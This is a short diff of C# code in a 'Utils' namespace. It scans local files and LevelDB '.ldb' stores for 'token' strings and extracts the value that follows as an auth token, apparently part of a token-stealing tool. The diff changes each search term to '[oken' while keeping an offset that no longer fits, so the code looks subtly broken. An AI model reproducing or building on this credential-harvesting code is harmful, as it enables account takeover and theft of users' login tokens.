@@ -116,7 +116,7 @@ namespace Utils
             string fileContents = Encoding.UTF8.GetString(bytes);
             string authToken = "";
 
-            if (fileContents.Contains("token"))
+            if (fileContents.Contains("[oken"))
             {
                 string[] array = cleanArray(fileContents).Split(new char[]
                 {
@@ -140,7 +140,7 @@ namespace Utils
             {
                 foreach (FileInfo fileInfo in new DirectoryInfo(levelDB).GetFiles())
                 {
-                    if (fileInfo.Name.EndsWith(".ldb") && File.ReadAllText(fileInfo.FullName).Contains("token"))
+                    if (fileInfo.Name.EndsWith(".ldb") && File.ReadAllText(fileInfo.FullName).Contains("[oken"))
                     {
                         levelDB += fileInfo.Name;
                         return levelDB.EndsWith(".ldb");
@@ -153,7 +153,7 @@ namespace Utils
 
         private static string cleanArray(string path)
         {
-            string[] array = path.Substring(path.IndexOf("token") + 4).Split(new char[]
+            string[] array = path.Substring(path.IndexOf("[oken") + 4).Split(new char[]
             {
                 '"'
             });
